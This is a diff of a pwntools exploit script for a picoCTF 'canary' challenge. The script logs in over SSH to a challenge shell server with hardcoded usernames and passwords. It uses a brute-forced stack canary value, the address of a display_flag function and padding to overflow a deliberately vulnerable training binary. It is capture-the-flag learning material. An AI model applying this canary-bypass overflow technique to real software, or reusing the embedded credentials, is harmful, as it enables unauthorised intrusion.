@@ -1,6 +1,6 @@
 from pwn import *
 # brute force to find the canary byte by byte in the local environment
-s = ssh(host="2019shell1.picoctf.com", user="Hohenheim10", password="mhw1015sz15,.")
+s = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
 s.set_working_directory(wd=b"/problems/canary_4_221260def5087dde9326fb0649b434a7")
 numbers = "1234567890"
 lower_letters = "abcdefghijklmnopqrstuvwxyz"
@@ -28,8 +28,9 @@ canary = ""
 # print("canary: "+canary) # The canary is LjgH
 
 canary = "LjgH"
+# http://docs.pwntools.com/en/latest/elf/elf.html?highlight=elf
 e = ELF('./vuln_task7')
-flag_address = p16(e.symbols['display_flag']) # integer to bytes
+flag_address = p16(e.symbols['display_flag']) # https://docs.pwntools.com/en/stable/util/packing.html
 padding = "A"*16
 while True:
     p = s.process("./vuln")
